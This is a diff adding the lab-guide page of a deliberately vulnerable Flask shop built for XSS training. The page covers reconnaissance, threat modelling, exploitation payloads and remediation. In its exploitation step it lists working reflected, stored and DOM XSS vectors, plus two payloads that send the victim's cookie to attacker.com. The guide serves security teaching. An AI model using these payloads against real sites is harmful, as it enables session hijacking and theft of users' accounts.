@@ -1,0 +1,120 @@
+{% extends "base.html" %}
+{% block title %}Lab Guide - XSS Lab{% endblock %}
+{% block content %}
+<div class="alert alert-danger">
+    <strong>Educational Lab:</strong> This application contains intentional XSS vulnerabilities. Use only in isolated training environments.
+</div>
+
+<h3>Lab 02 — Cross-Site Scripting (XSS) Lab Guide</h3>
+<p><strong>Application:</strong> FlaskShop E-Commerce (Python Flask)</p>
+<p><strong>Target URL:</strong> <a href="http://localhost:5000">http://localhost:5000</a></p>
+
+<!-- Step 1 -->
+<div class="card mb-3">
+    <div class="card-header bg-dark text-white"><h6 class="mb-0">Step 1: Reconnaissance — Map Input Points</h6></div>
+    <div class="card-body">
+        <p>Find all places user input is reflected in the page output:</p>
+        <table class="table table-sm">
+            <thead><tr><th>Endpoint</th><th>Parameter</th><th>XSS Type</th><th>Reflected In</th></tr></thead>
+            <tbody>
+                <tr><td><code>GET /search?q=</code></td><td>q</td><td>Reflected</td><td>Search results heading</td></tr>
+                <tr><td><code>POST /add_review/N</code></td><td>content</td><td>Stored</td><td>Product review section</td></tr>
+                <tr><td><code>GET /profile#</code></td><td>URL hash</td><td>DOM-based</td><td>Greeting div (innerHTML)</td></tr>
+                <tr><td><code>POST /contact</code></td><td>name, message</td><td>Blind (Stored)</td><td>Admin contacts page</td></tr>
+                <tr><td><code>GET /nonexistent</code></td><td>URL itself</td><td>Reflected</td><td>404 error page</td></tr>
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<!-- Step 2 -->
+<div class="card mb-3">
+    <div class="card-header bg-dark text-white"><h6 class="mb-0">Step 2: Threat Modeling</h6></div>
+    <div class="card-body">
+        <table class="table table-sm">
+            <thead><tr><th>Threat</th><th>Attack</th><th>Impact</th><th>CVSS</th></tr></thead>
+            <tbody>
+                <tr><td>Session Hijacking</td><td>XSS → steal session cookie</td><td>Account takeover</td><td>8.8 High</td></tr>
+                <tr><td>Credential Harvesting</td><td>XSS → fake login form</td><td>Password theft</td><td>8.1 High</td></tr>
+                <tr><td>Admin Compromise</td><td>Blind XSS in contact form</td><td>Admin account takeover</td><td>9.0 Critical</td></tr>
+                <tr><td>Malware Distribution</td><td>Stored XSS → redirect to malware</td><td>Visitor infection</td><td>8.8 High</td></tr>
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<!-- Step 3 -->
+<div class="card mb-3">
+    <div class="card-header bg-dark text-white"><h6 class="mb-0">Step 3: Exploitation</h6></div>
+    <div class="card-body">
+
+        <h6 class="text-danger">XSS-001: Reflected XSS</h6>
+        <p>Visit: <a href="/search?q=<script>alert('Reflected XSS')</script>">/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</a></p>
+        <pre><code>/search?q=&lt;script&gt;alert('XSS-Reflected')&lt;/script&gt;
+/search?q=&lt;img src=x onerror=alert('XSS')&gt;
+/search?q=&lt;svg onload=alert(1)&gt;</code></pre>
+
+        <h6 class="text-danger mt-3">XSS-002: Stored XSS</h6>
+        <p>Login, go to any product, submit a review with:</p>
+        <pre><code>&lt;script&gt;alert('Stored XSS - runs for every visitor!')&lt;/script&gt;</code></pre>
+        <p>Everyone who views that product page will execute your script.</p>
+
+        <h6 class="text-danger mt-3">XSS-003: DOM-Based XSS</h6>
+        <p>Visit (after logging in):</p>
+        <pre><code>/profile#&lt;img src=x onerror=alert('DOM-XSS')&gt;</code></pre>
+
+        <h6 class="text-danger mt-3">XSS-004: Blind XSS (steals admin session)</h6>
+        <p>Submit contact form with this message (attacker would host the listener):</p>
+        <pre><code>&lt;script&gt;
+var img = new Image();
+img.src = 'http://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
+&lt;/script&gt;</code></pre>
+        <p>When admin visits <a href="/admin/contacts">/admin/contacts</a>, their cookie is sent to attacker.</p>
+
+        <h6 class="text-danger mt-3">Session Hijack Payload</h6>
+        <pre><code>&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;</code></pre>
+    </div>
+</div>
+
+<!-- Step 4 -->
+<div class="card mb-3">
+    <div class="card-header bg-dark text-white"><h6 class="mb-0">Step 4: Impact Assessment</h6></div>
+    <div class="card-body">
+        <ul>
+            <li><strong>Session hijacking:</strong> Attacker steals admin cookie → full admin access</li>
+            <li><strong>Credential phishing:</strong> Fake login form injected into trusted site</li>
+            <li><strong>Persistent malware:</strong> Stored XSS executes on every page load for all users</li>
+            <li><strong>Data exfiltration:</strong> DOM storage, cookies, form data stolen</li>
+        </ul>
+    </div>
+</div>
+
+<!-- Step 5 -->
+<div class="card mb-3">
+    <div class="card-header bg-success text-white"><h6 class="mb-0">Step 5: Remediation</h6></div>
+    <div class="card-body">
+        <h6>1. Use Jinja2 Auto-Escaping (default behavior)</h6>
+        <pre><code># VULNERABLE:
+{{ user_input | safe }}   # disables escaping!
+
+# SECURE:
+{{ user_input }}          # Jinja2 escapes by default → &lt;script&gt; becomes &amp;lt;script&amp;gt;</code></pre>
+
+        <h6>2. Sanitize Stored Content (bleach library)</h6>
+        <pre><code>import bleach
+safe_content = bleach.clean(user_input, tags=[], attributes={}, strip=True)</code></pre>
+
+        <h6>3. Set Content Security Policy Header</h6>
+        <pre><code>@app.after_request
+def add_security_headers(response):
+    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
+    response.headers['X-XSS-Protection'] = '1; mode=block'
+    return response</code></pre>
+
+        <h6>4. HttpOnly Cookies</h6>
+        <pre><code>app.config['SESSION_COOKIE_HTTPONLY'] = True   # prevents JS access to cookie
+app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'</code></pre>
+    </div>
+</div>
+
+{% endblock %}
